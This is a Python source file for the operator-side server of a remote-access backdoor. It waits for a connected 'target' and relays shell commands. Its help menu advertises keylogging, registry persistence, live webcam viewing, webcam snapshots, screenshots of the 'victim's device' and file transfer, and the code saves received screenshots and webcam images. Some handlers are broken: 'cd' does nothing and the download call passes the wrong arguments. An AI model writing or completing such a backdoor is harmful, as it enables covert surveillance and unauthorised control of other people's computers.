
from sys import platform
import json
import socket
import os
import datetime
class Server:
    def __init__(self):
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # ipv4, tcp
        sock.bind(("127.0.0.1", 6969))
        print("[!] Listening for incoming connections...")
        sock.listen(5)
        self.connection, self.ip = sock.accept()
        print(f"[!] Target connected from {self.ip}")
        self.target_communication()



    def reliable_send(self, data):
        try:
            jsondata = json.dumps(data)
            self.connection.send(jsondata.encode())
        except Exception as e:
            print(f"Failed to send data (server.py) {e}")








    def target_communication(self):
        count = 0
        while True:
            command = input(f"Shell ({self.ip}) >> ")
            self.reliable_send(command)
            if command == "terminate":
                try:
                    break
                except ConnectionResetError:
                    pass
                finally:
                    break
            elif command == "help":
                print("""\n
                help                                    ---> Shows this page.
                terminate                               ---> Terminates the session.
                clear                                   ---> Clears the output screen.
                cd "Dir name"                           ---> Changes directory on targets system.
                upload "File name"                      ---> Uploads files to targets system.
                download "File name"                    ---> Downloads a file from targets system.
                keylog_run                              ---> Starts the keylogger.
                keylog_dumpcontents                     ---> Outputs the keylogs file contents.
                keylog_terminate                        ---> Terminates the keylogger and self destructs file.      
                persistence "FileName"                  ---> Creates persistence of the backdoor in registry.
                remove_persistence                      ---. Removes the persistence of the program on startup.
                live_webcam                             ---> View live footage from the webcam.
                webcam_snap                             ---> Takes a snap from the webcam and saves it to your machine.
                screenshot                              ---> Screenshots the victims device and sends it to your machine. 
                 """)

            elif command == "clear":
                if platform == "linux":
                    os.system("clear")

                elif platform == "win32":
                    os.system("cls")
            elif command[:3] == "cd ":
                pass

            elif command[:6] == "upload":
                self.upload_file(command[7:])
            
            elif command[:8] == "download":
                self.download_file(command[9:])

            elif command[:10] == "screenshot":
                with open(f"Penetration Testing\Backdoor\Screenshots&Webcams\Screenshot{count}.png", "wb") as f:
                    self.connection.settimeout(3)
                    chunk = self.connection.recv(1024)
                    while chunk:
                        f.write(chunk)
                        try:
                            chunk = self.connection.recv(1024)
                        except socket.timeout as e:
                            break
                        except Exception as e:
                            print(f"Exception: {e}")
                            return 
                        #self.connection.settimeout(None)
                    count+=1
                    print("[!] Successfully rendered the screenshot.")

            elif command[:11] == "webcam_snap":
                current_time = datetime.datetime.now()
                with open(f"Penetration Testing\Backdoor\Screenshots&Webcams\WebcamSnap_(Date-{current_time.year}-{current_time.month}-{current_time.day}-Time-{current_time.hour}-{current_time.minute}-{current_time.second}).png", "wb") as f:
                    self.connection.settimeout(10)
                    #print(self.recv_data())
                    chunk = self.connection.recv(1024) # failes to recv data
                    
                    while chunk:
                        f.write(chunk)
                        try:
                            chunk = self.connection.recv(1024)
                        except socket.timeout as e:
                            print(f"Timeout Error: {e}")
                            break
                        except Exception as e:
                            print(f"Exception: {e}")
                            return 
                        #self.connection.settimeout(None)
                    print("[!] Successfully rendered webcam snap.")

            else:
                result = self.recv_data()
                print(result)

    def recv_data(self):
        data = ""
        while True:
            try:
                rawdata = self.connection.recv(1024)
            except OSError:
                raise
            try:
                data = data + rawdata.decode().rstrip()
                return json.loads(data) 

            except ValueError as e:
                print(rawdata.decode("ISO-8859-1").rstrip() or "\n", end='')
                continue
            except Exception as e:
                print(f"Failed to recieve data (server.py) {e}")

    def upload_file(self, filename):
        with open(filename, "rb") as f:
            self.connection.send(f.read())


    def download_file(self, filename, data):
        with open(filename, "wb") as f:
            self.connection.settimeout(1)
            chunk = self.connection.recv(1024)
            while chunk:
                f.write(chunk)
                try:
                    chunk = self.connection.recv(1024)
                except socket.timeout as e:
                    break
                self.connection.settimeout(None)

            
serverdoor = Server()




